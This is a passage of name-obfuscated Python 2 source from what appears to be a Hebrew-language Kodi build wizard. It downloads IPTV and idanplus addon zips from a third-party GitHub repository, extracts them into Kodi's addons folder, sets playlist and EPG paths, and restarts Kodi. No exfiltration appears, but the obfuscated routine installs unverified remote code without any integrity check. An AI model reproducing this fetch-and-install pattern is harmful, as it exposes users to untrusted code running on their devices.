                        OO0O00OOO0OO00O0O =0 #line:5664
                    OO0O0O0OO0O0OOO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO0OOO0OOO00OO ,O00OO000O0OOOO0OO )#line:5665
                    OO00000O0000000OO .update (int (O00OOO00OOO00000O ),"Downloading "+'iptv',O0O0O000OO0O0O0O0 ,OO0O0O0OO0O0OOO0O )#line:5667
              OOOO0O000OOO000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5670
              O0000O00O0OOOO00O .close ()#line:5673
              extract .all (O0000OOOOO0O00OOO ,OOOO0O000OOO000O0 ,OO00000O0000000OO )#line:5674
              try :#line:5675
                os .remove (O0000OOOOO0O00OOO )#line:5676
              except :#line:5678
                pass #line:5679
              OO00000O0000000OO .close ()#line:5680
def iptvkodi17_18 ():#line:5681
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:5684
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5685
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5686
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5690
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:5691
              OO000OO0O0O0000OO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5693
              OO0O00000O0O0OO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5694
              OOO0O000O0O0000OO =xbmcgui .DialogProgress ()#line:5695
              OOO0O000O0O0000OO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:5696
              OO0000OO0OOO00O00 =os .path .join (OO0O00000O0O0OO0O ,'isr.zip')#line:5697
              OOOOOOO0O000OO0O0 =urllib2 .Request (OO000OO0O0O0000OO )#line:5698
              OOOOOO000O0O00OO0 =urllib2 .urlopen (OOOOOOO0O000OO0O0 )#line:5699
              OO0OO0OOOOO00O00O =xbmcgui .DialogProgress ()#line:5701
              OO0OO0OOOOO00O00O .create ("Downloading","Downloading "+'iptv')#line:5702
              OO0OO0OOOOO00O00O .update (0 )#line:5703
              O0O00OO00O0O0000O =open (OO0000OO0OOO00O00 ,'wb')#line:5705
              try :#line:5707
                O0O000OOOO000O0OO =OOOOOO000O0O00OO0 .info ().getheader ('Content-Length').strip ()#line:5708
                O0O0O0O00OOOO00O0 =True #line:5709
              except AttributeError :#line:5710
                    O0O0O0O00OOOO00O0 =False #line:5711
              if O0O0O0O00OOOO00O0 :#line:5713
                    O0O000OOOO000O0OO =int (O0O000OOOO000O0OO )#line:5714
              O00OOOO0O0O0OOO00 =0 #line:5716
              O00000O0O0OO0OOO0 =time .time ()#line:5717
              while True :#line:5718
                    O0O00OO0000O000O0 =OOOOOO000O0O00OO0 .read (8192 )#line:5719
                    if not O0O00OO0000O000O0 :#line:5720
                        sys .stdout .write ('\n')#line:5721
                        break #line:5722
                    O00OOOO0O0O0OOO00 +=len (O0O00OO0000O000O0 )#line:5724
                    O0O00OO00O0O0000O .write (O0O00OO0000O000O0 )#line:5725
                    if not O0O0O0O00OOOO00O0 :#line:5727
                        O0O000OOOO000O0OO =O00OOOO0O0O0OOO00 #line:5728
                    if OO0OO0OOOOO00O00O .iscanceled ():#line:5729
                       OO0OO0OOOOO00O00O .close ()#line:5730
                       try :#line:5731
                        os .remove (OO0000OO0OOO00O00 )#line:5732
                       except :#line:5733
                        pass #line:5734
                       break #line:5735
                    O00000OOO00O0OOO0 =float (O00OOOO0O0O0OOO00 )/O0O000OOOO000O0OO #line:5736
                    O00000OOO00O0OOO0 =round (O00000OOO00O0OOO0 *100 ,2 )#line:5737
                    OO00O000O00O0000O =O00OOOO0O0O0OOO00 /(1024 *1024 )#line:5738
                    OO0OOOOOOO0OOO0OO =O0O000OOOO000O0OO /(1024 *1024 )#line:5739
                    OOOOO0O0O00000O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00O000O00O0000O ,'teal',OO0OOOOOOO0OOO0OO )#line:5740
                    if (time .time ()-O00000O0O0OO0OOO0 )>0 :#line:5741
                      O00O00O0000O00000 =O00OOOO0O0O0OOO00 /(time .time ()-O00000O0O0OO0OOO0 )#line:5742
                      O00O00O0000O00000 =O00O00O0000O00000 /1024 #line:5743
                    else :#line:5744
                     O00O00O0000O00000 =0 #line:5745
                    OOO00O000O00O000O ='KB'#line:5746
                    if O00O00O0000O00000 >=1024 :#line:5747
                       O00O00O0000O00000 =O00O00O0000O00000 /1024 #line:5748
                       OOO00O000O00O000O ='MB'#line:5749
                    if O00O00O0000O00000 >0 and not O00000OOO00O0OOO0 ==100 :#line:5750
                        O0OO0OO00000O0OOO =(O0O000OOOO000O0OO -O00OOOO0O0O0OOO00 )/O00O00O0000O00000 #line:5751
                    else :#line:5752
                        O0OO0OO00000O0OOO =0 #line:5753
                    O00OO0O0OO00O000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O00O0000O00000 ,OOO00O000O00O000O )#line:5754
                    OO0OO0OOOOO00O00O .update (int (O00000OOO00O0OOO0 ),"Downloading "+'iptv',OOOOO0O0O00000O0O ,O00OO0O0OO00O000O )#line:5756
              O0O0O0OOOO0O0000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5759
              O0O00OO00O0O0000O .close ()#line:5762
              extract .all (OO0000OO0OOO00O00 ,O0O0O0OOOO0O0000O ,OO0OO0OOOOO00O00O )#line:5763
              wiz .kodi17Fix ()#line:5765
              try :#line:5767
                os .remove (OO0000OO0OOO00O00 )#line:5768
              except :#line:5770
                pass #line:5771
              OO0OO0OOOOO00O00O .close ()#line:5772
              xbmc .sleep (5000 )#line:5774
              OO00000OOO0O00000 ='התקנת לקוח טלוויזיה חיה'#line:5776
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00000OOO0O00000 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5777
              resetkodi ()#line:5778
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5779
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5780
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:5781
              OO000OO0O0O0000OO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5782
              OO0O00000O0O0OO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5783
              OOO0O000O0O0000OO =xbmcgui .DialogProgress ()#line:5784
              OOO0O000O0O0000OO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:5785
              OO0000OO0OOO00O00 =os .path .join (OO0O00000O0O0OO0O ,'isr.zip')#line:5786
              OOOOOOO0O000OO0O0 =urllib2 .Request (OO000OO0O0O0000OO )#line:5787
              OOOOOO000O0O00OO0 =urllib2 .urlopen (OOOOOOO0O000OO0O0 )#line:5788
              OO0OO0OOOOO00O00O =xbmcgui .DialogProgress ()#line:5790
              OO0OO0OOOOO00O00O .create ("Downloading","Downloading "+'iptv')#line:5791
              OO0OO0OOOOO00O00O .update (0 )#line:5792
              O0O00OO00O0O0000O =open (OO0000OO0OOO00O00 ,'wb')#line:5794
              try :#line:5796
                O0O000OOOO000O0OO =OOOOOO000O0O00OO0 .info ().getheader ('Content-Length').strip ()#line:5797
                O0O0O0O00OOOO00O0 =True #line:5798
              except AttributeError :#line:5799
                    O0O0O0O00OOOO00O0 =False #line:5800
              if O0O0O0O00OOOO00O0 :#line:5802
                    O0O000OOOO000O0OO =int (O0O000OOOO000O0OO )#line:5803
              O00OOOO0O0O0OOO00 =0 #line:5805
              O00000O0O0OO0OOO0 =time .time ()#line:5806
              while True :#line:5807
                    O0O00OO0000O000O0 =OOOOOO000O0O00OO0 .read (8192 )#line:5808
                    if not O0O00OO0000O000O0 :#line:5809
                        sys .stdout .write ('\n')#line:5810
                        break #line:5811
                    O00OOOO0O0O0OOO00 +=len (O0O00OO0000O000O0 )#line:5813
                    O0O00OO00O0O0000O .write (O0O00OO0000O000O0 )#line:5814
                    if not O0O0O0O00OOOO00O0 :#line:5816
                        O0O000OOOO000O0OO =O00OOOO0O0O0OOO00 #line:5817
                    if OO0OO0OOOOO00O00O .iscanceled ():#line:5818
                       OO0OO0OOOOO00O00O .close ()#line:5819
                       try :#line:5820
                        os .remove (OO0000OO0OOO00O00 )#line:5821
                       except :#line:5822
                        pass #line:5823
                       break #line:5824
                    O00000OOO00O0OOO0 =float (O00OOOO0O0O0OOO00 )/O0O000OOOO000O0OO #line:5825
                    O00000OOO00O0OOO0 =round (O00000OOO00O0OOO0 *100 ,2 )#line:5826
                    OO00O000O00O0000O =O00OOOO0O0O0OOO00 /(1024 *1024 )#line:5827
                    OO0OOOOOOO0OOO0OO =O0O000OOOO000O0OO /(1024 *1024 )#line:5828
                    OOOOO0O0O00000O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00O000O00O0000O ,'teal',OO0OOOOOOO0OOO0OO )#line:5829
                    if (time .time ()-O00000O0O0OO0OOO0 )>0 :#line:5830
                      O00O00O0000O00000 =O00OOOO0O0O0OOO00 /(time .time ()-O00000O0O0OO0OOO0 )#line:5831
                      O00O00O0000O00000 =O00O00O0000O00000 /1024 #line:5832
                    else :#line:5833
                     O00O00O0000O00000 =0 #line:5834
                    OOO00O000O00O000O ='KB'#line:5835
                    if O00O00O0000O00000 >=1024 :#line:5836
                       O00O00O0000O00000 =O00O00O0000O00000 /1024 #line:5837
                       OOO00O000O00O000O ='MB'#line:5838
                    if O00O00O0000O00000 >0 and not O00000OOO00O0OOO0 ==100 :#line:5839
                        O0OO0OO00000O0OOO =(O0O000OOOO000O0OO -O00OOOO0O0O0OOO00 )/O00O00O0000O00000 #line:5840
                    else :#line:5841
                        O0OO0OO00000O0OOO =0 #line:5842
                    O00OO0O0OO00O000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O00O0000O00000 ,OOO00O000O00O000O )#line:5843
                    OO0OO0OOOOO00O00O .update (int (O00000OOO00O0OOO0 ),"Downloading "+'iptv',OOOOO0O0O00000O0O ,O00OO0O0OO00O000O )#line:5845
              O0O0O0OOOO0O0000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5848
              O0O00OO00O0O0000O .close ()#line:5851
              extract .all (OO0000OO0OOO00O00 ,O0O0O0OOOO0O0000O ,OO0OO0OOOOO00O00O )#line:5852
              wiz .kodi17Fix ()#line:5853
              try :#line:5855
                os .remove (OO0000OO0OOO00O00 )#line:5856
              except :#line:5858
                pass #line:5859
              OO0OO0OOOOO00O00O .close ()#line:5860
              xbmc .sleep (5000 )#line:5862
              OO00000OOO0O00000 ='התקנת לקוח טלוויזיה חיה'#line:5864
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00000OOO0O00000 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5865
              resetkodi ()#line:5866
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5868
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:5869
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5870
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5871
def iptvidanplus ():#line:5872
    O0OOO000OO00O0OO0 =xbmcaddon .Addon ('plugin.video.idanplus')#line:5873
    O0OOO000OO00O0OO0 .setSetting ('useIPTV','true')#line:5874
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:5875
    if KODIV >=17 and KODIV <18 :#line:5878
        O000OOO0OO00O0OO0 ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:5880
        O0O00000OO0OOOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5881
        OOOO0O0000OO00OO0 =xbmcgui .DialogProgress ()#line:5882
        OOOO0O0000OO00OO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5883
        O000000O0OO0OOOOO =os .path .join (PACKAGES ,'isr.zip')#line:5884
        OO0O0OOO00OO0000O =urllib2 .Request (O000OOO0OO00O0OO0 )#line:5885
        OOOOO0O0OOO0OO00O =urllib2 .urlopen (OO0O0OOO00OO0000O )#line:5886
        O000O0OO0O00O0OOO =xbmcgui .DialogProgress ()#line:5888
        O000O0OO0O00O0OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5889
        O000O0OO0O00O0OOO .update (0 )#line:5890
        O00O00OO00000O000 =open (O000000O0OO0OOOOO ,'wb')#line:5892
        try :#line:5894
          O00O0O0OO000O0O00 =OOOOO0O0OOO0OO00O .info ().getheader ('Content-Length').strip ()#line:5895
          O00OO0O0O0000O0O0 =True #line:5896
        except AttributeError :#line:5897
              O00OO0O0O0000O0O0 =False #line:5898
        if O00OO0O0O0000O0O0 :#line:5900
              O00O0O0OO000O0O00 =int (O00O0O0OO000O0O00 )#line:5901
        OOOOO00OO0O0000OO =0 #line:5903
        O0O00OOO00O0OO0O0 =time .time ()#line:5904
        while True :#line:5905
              O0OOO00OO0OOO0OOO =OOOOO0O0OOO0OO00O .read (8192 )#line:5906
              if not O0OOO00OO0OOO0OOO :#line:5907
                  sys .stdout .write ('\n')#line:5908
                  break #line:5909
              OOOOO00OO0O0000OO +=len (O0OOO00OO0OOO0OOO )#line:5911
              O00O00OO00000O000 .write (O0OOO00OO0OOO0OOO )#line:5912
              if not O00OO0O0O0000O0O0 :#line:5914
                  O00O0O0OO000O0O00 =OOOOO00OO0O0000OO #line:5915
              if O000O0OO0O00O0OOO .iscanceled ():#line:5916
                 O000O0OO0O00O0OOO .close ()#line:5917
                 try :#line:5918
                  os .remove (O000000O0OO0OOOOO )#line:5919
                 except :#line:5920
                  pass #line:5921
                 break #line:5922
              OOOOO00OO0O00OO00 =float (OOOOO00OO0O0000OO )/O00O0O0OO000O0O00 #line:5923
              OOOOO00OO0O00OO00 =round (OOOOO00OO0O00OO00 *100 ,2 )#line:5924
              O00OOOOO0OOOOOOOO =OOOOO00OO0O0000OO /(1024 *1024 )#line:5925
              O0000OOO0O00OO000 =O00O0O0OO000O0O00 /(1024 *1024 )#line:5926
              O0OOO0O000O0000OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OOOOO0OOOOOOOO ,'teal',O0000OOO0O00OO000 )#line:5927
              if (time .time ()-O0O00OOO00O0OO0O0 )>0 :#line:5928
                O0000OOO00OO00O00 =OOOOO00OO0O0000OO /(time .time ()-O0O00OOO00O0OO0O0 )#line:5929
                O0000OOO00OO00O00 =O0000OOO00OO00O00 /1024 #line:5930
              else :#line:5931
               O0000OOO00OO00O00 =0 #line:5932
              OOOOO00000OO0O00O ='KB'#line:5933
              if O0000OOO00OO00O00 >=1024 :#line:5934
                 O0000OOO00OO00O00 =O0000OOO00OO00O00 /1024 #line:5935
                 OOOOO00000OO0O00O ='MB'#line:5936
              if O0000OOO00OO00O00 >0 and not OOOOO00OO0O00OO00 ==100 :#line:5937
                  OO00O0O0OO0OOO000 =(O00O0O0OO000O0O00 -OOOOO00OO0O0000OO )/O0000OOO00OO00O00 #line:5938
              else :#line:5939
                  OO00O0O0OO0OOO000 =0 #line:5940
              OOO000000OOO00O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0000OOO00OO00O00 ,OOOOO00000OO0O00O )#line:5941
              O000O0OO0O00O0OOO .update (int (OOOOO00OO0O00OO00 ),O0OOO0O000O0000OO ,OOO000000OOO00O0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5943
        OOO0000O0O0O00O0O =xbmc .translatePath (os .path .join ('special://home/'))#line:5946
        O00O00OO00000O000 .close ()#line:5949
        extract .all (O000000O0OO0OOOOO ,OOO0000O0O0O00O0O ,O000O0OO0O00O0OOO )#line:5950
        try :#line:5954
          os .remove (O000000O0OO0OOOOO )#line:5955
        except :#line:5956
          pass #line:5957
        wiz .kodi17Fix ()#line:5958
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5959
        time .sleep (10 )#line:5960
        O00OOO0000OO000O0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:5961
        O00OOO0000OO000O0 .setSetting ('epgTimeShift','1.000000')#line:5962
        O00OOO0000OO000O0 .setSetting ('m3uPathType','0')#line:5963
        O00OOO0000OO000O0 .setSetting ('epgPathType','0')#line:5964
        O00OOO0000OO000O0 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:5965
        O00OOO0000OO000O0 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:5966
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:5967
        resetkodi ()#line:5968
    if KODIV >=18 :#line:5971
        iptvkodi18idan ()#line:5973
        wiz .kodi17Fix ()#line:5974
        time .sleep (10 )#line:5976
        O00OOO0000OO000O0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:5977
        O00OOO0000OO000O0 .setSetting ('epgTimeShift','1.000000')#line:5978
        O00OOO0000OO000O0 .setSetting ('m3uPathType','0')#line:5979
        O00OOO0000OO000O0 .setSetting ('epgPathType','0')#line:5980
        O00OOO0000OO000O0 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:5981
        O00OOO0000OO000O0 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:5982
        O0OOO0O00OO000OOO ='הגדרת ערוצי עידן פלוס'#line:5983
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0O00OO000OOO ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5984
        resetkodi ()#line:5985
def iptvsimpldown ():#line:6001
    O0O0OO0OOOOO0OOO0 =(IPTV18 )#line:6003
    O0O0000O000000OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6004
    OOO0000O000OO00OO =xbmcgui .DialogProgress ()#line:6005
    OOO0000O000OO00OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6006
    OOO0OO0OOOO000O00 =os .path .join (PACKAGES ,'isr.zip')#line:6007
    OO000000000OOOO00 =urllib2 .Request (O0O0OO0OOOOO0OOO0 )#line:6008
    O00O0OOOOO0O00OO0 =urllib2 .urlopen (OO000000000OOOO00 )#line:6009
    O00000O000O00O0OO =xbmcgui .DialogProgress ()#line:6011
    O00000O000O00O0OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6012
    O00000O000O00O0OO .update (0 )#line:6013
    O000000OOOOOOOO00 =open (OOO0OO0OOOO000O00 ,'wb')#line:6015
    try :#line:6017
      O000O00OO0O00O000 =O00O0OOOOO0O00OO0 .info ().getheader ('Content-Length').strip ()#line:6018
      O00OO00OOOO000OO0 =True #line:6019
    except AttributeError :#line:6020
          O00OO00OOOO000OO0 =False #line:6021
    if O00OO00OOOO000OO0 :#line:6023
          O000O00OO0O00O000 =int (O000O00OO0O00O000 )#line:6024
    O00OO00O0OO00OOOO =0 #line:6026
    OOO00OO000O00O00O =time .time ()#line:6027
    while True :#line:6028
          O0O00OO00O0O0O000 =O00O0OOOOO0O00OO0 .read (8192 )#line:6029
          if not O0O00OO00O0O0O000 :#line:6030
              sys .stdout .write ('\n')#line:6031
              break #line:6032
          O00OO00O0OO00OOOO +=len (O0O00OO00O0O0O000 )#line:6034
          O000000OOOOOOOO00 .write (O0O00OO00O0O0O000 )#line:6035
          if not O00OO00OOOO000OO0 :#line:6037
              O000O00OO0O00O000 =O00OO00O0OO00OOOO #line:6038
          if O00000O000O00O0OO .iscanceled ():#line:6039
             O00000O000O00O0OO .close ()#line:6040
             try :#line:6041
              os .remove (OOO0OO0OOOO000O00 )#line:6042
             except :#line:6043
              pass #line:6044
             break #line:6045
          O0O00O0OO0O0OOO00 =float (O00OO00O0OO00OOOO )/O000O00OO0O00O000 #line:6046
          O0O00O0OO0O0OOO00 =round (O0O00O0OO0O0OOO00 *100 ,2 )#line:6047
          OO0000OO00OO0O0O0 =O00OO00O0OO00OOOO /(1024 *1024 )#line:6048
          OO00OO0000O000O0O =O000O00OO0O00O000 /(1024 *1024 )#line:6049
          O00O0OOOOOO0OOO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0000OO00OO0O0O0 ,'teal',OO00OO0000O000O0O )#line:6050
          if (time .time ()-OOO00OO000O00O00O )>0 :#line:6051
            OO00OOOOO0000OO00 =O00OO00O0OO00OOOO /(time .time ()-OOO00OO000O00O00O )#line:6052
            OO00OOOOO0000OO00 =OO00OOOOO0000OO00 /1024 #line:6053
          else :#line:6054
           OO00OOOOO0000OO00 =0 #line:6055
          O000O0000OO00O0OO ='KB'#line:6056
          if OO00OOOOO0000OO00 >=1024 :#line:6057
             OO00OOOOO0000OO00 =OO00OOOOO0000OO00 /1024 #line:6058
             O000O0000OO00O0OO ='MB'#line:6059
          if OO00OOOOO0000OO00 >0 and not O0O00O0OO0O0OOO00 ==100 :#line:6060
              OO000000OOO0O0OOO =(O000O00OO0O00O000 -O00OO00O0OO00OOOO )/OO00OOOOO0000OO00 #line:6061
          else :#line:6062
              OO000000OOO0O0OOO =0 #line:6063
          OOO00OO00O00OOOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00OOOOO0000OO00 ,O000O0000OO00O0OO )#line:6064
          O00000O000O00O0OO .update (int (O0O00O0OO0O0OOO00 ),O00O0OOOOOO0OOO0O ,OOO00OO00O00OOOOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6066
    O000000O0OOO0OOOO =xbmc .translatePath (os .path .join ('special://home/'))#line:6069
    O000000OOOOOOOO00 .close ()#line:6072
    extract .all (OOO0OO0OOOO000O00 ,O000000O0OOO0OOOO ,O00000O000O00O0OO )#line:6073
    try :#line:6077
      os .remove (OOO0OO0OOOO000O00 )#line:6078
    except :#line:6079
      pass #line:6080
def testnotify ():#line:6081
	O00O0OOO000OO0O0O =wiz .workingURL (NOTIFICATION )#line:6082
	if O00O0OOO000OO0O0O ==True :#line:6083
		try :#line:6084
			O0O00OOOOOOOO0O00 ,O00O00000OOOO0O00 =wiz .splitNotify (NOTIFICATION )#line:6085
			if O0O00OOOOOOOO0O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6086
			if STARTP2 ()=='ok':#line:6087
				notify .notification (O00O00000OOOO0O00 ,True )#line:6088
		except Exception as O0OO000OO00O00O00 :#line:6089
			wiz .log ("Error on Notifications Window: %s"%str (O0OO000OO00O00O00 ),xbmc .LOGERROR )#line:6090
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6091
def testnotify2 ():#line:6092
	O00O00O0OOOOOOO00 =wiz .workingURL (NOTIFICATION2 )#line:6093
	if O00O00O0OOOOOOO00 ==True :#line:6094
		try :#line:6095
			OO0OOO000OO00O0OO ,O00OOO0OO00O0000O =wiz .splitNotify (NOTIFICATION2 )#line:6096
			if OO0OOO000OO00O0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6097
			if STARTP2 ()=='ok':#line:6098
				notify .notification2 (O00OOO0OO00O0000O ,True )#line:6099
		except Exception as O000O0O0000000OOO :#line:6100
			wiz .log ("Error on Notifications Window: %s"%str (O000O0O0000000OOO ),xbmc .LOGERROR )#line:6101
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6102
def testnotify3 ():#line:6103
	O00O0O000O0O00O00 =wiz .workingURL (NOTIFICATION3 )#line:6104
	if O00O0O000O0O00O00 ==True :#line:6105
		try :#line:6106
			O0OO0O00000OO0O00 ,O000OO0000O00OO0O =wiz .splitNotify (NOTIFICATION3 )#line:6107
			if O0OO0O00000OO0O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6108
			if STARTP2 ()=='ok':#line:6109
				notify .notification3 (O000OO0000O00OO0O ,True )#line:6110
		except Exception as O0O0OO0O0O00OO0OO :#line:6111
			wiz .log ("Error on Notifications Window: %s"%str (O0O0OO0O0O00OO0OO ),xbmc .LOGERROR )#line:6112
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6113
def wait ():#line:6114
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6115
def infobuild ():#line:6116
	O000O00O0OO0OOO0O =wiz .workingURL (NOTIFICATION )#line:6117
	if O000O00O0OO0OOO0O ==True :#line:6118
		try :#line:6119
			OO0O0OOOOO00O000O ,OO00OOO0OOOOO0O00 =wiz .splitNotify (NOTIFICATION )#line:6120
			if OO0O0OOOOO00O000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6121
			if STARTP2 ()=='ok':#line:6122
				notify .updateinfo (OO00OOO0OOOOO0O00 ,True )#line:6123
		except Exception as OOOOO0O00OOO0O000 :#line:6124
			wiz .log ("Error on Notifications Window: %s"%str (OOOOO0O00OOO0O000 ),xbmc .LOGERROR )#line:6125
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6126
def servicemanual ():#line:6127
	OO000O00O00OOO00O =wiz .workingURL (HELPINFO )#line:6128
	if OO000O00O00OOO00O ==True :#line:6129
		try :#line:6130
			O0O00O000OO0OOO00 ,OOO00O00OO000O0OO =wiz .splitNotify (HELPINFO )#line:6131
			if O0O00O000OO0OOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6132
			notify .helpinfo (OOO00O00OO000O0OO ,True )#line:6133
		except Exception as OO0O0O0000OO0O0OO :#line:6134
			wiz .log ("Error on Notifications Window: %s"%str (OO0O0O0000OO0O0OO ),xbmc .LOGERROR )#line:6135
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6136
def testupdate ():#line:6138
	if BUILDNAME =="":#line:6139
		notify .updateWindow ()#line:6140
	else :#line:6141
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6142
def testfirst ():#line:6144
	notify .firstRun ()#line:6145
def testfirstRun ():#line:6147
	notify .firstRunSettings ()#line:6148
def fastinstall ():#line:6151
	notify .firstRuninstall ()#line:6152
def addDir (OOOOO000OOOOOO000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6159
	OO0OO0000O00OOO00 =sys .argv [0 ]#line:6160
	if not mode ==None :OO0OO0000O00OOO00 +="?mode=%s"%urllib .quote_plus (mode )#line:6161
	if not name ==None :OO0OO0000O00OOO00 +="&name="+urllib .quote_plus (name )#line:6162
	if not url ==None :OO0OO0000O00OOO00 +="&url="+urllib .quote_plus (url )#line:6163
	OOOO0OO00O00O0OO0 =True #line:6164
	if themeit :OOOOO000OOOOOO000 =themeit %OOOOO000OOOOOO000 #line:6165
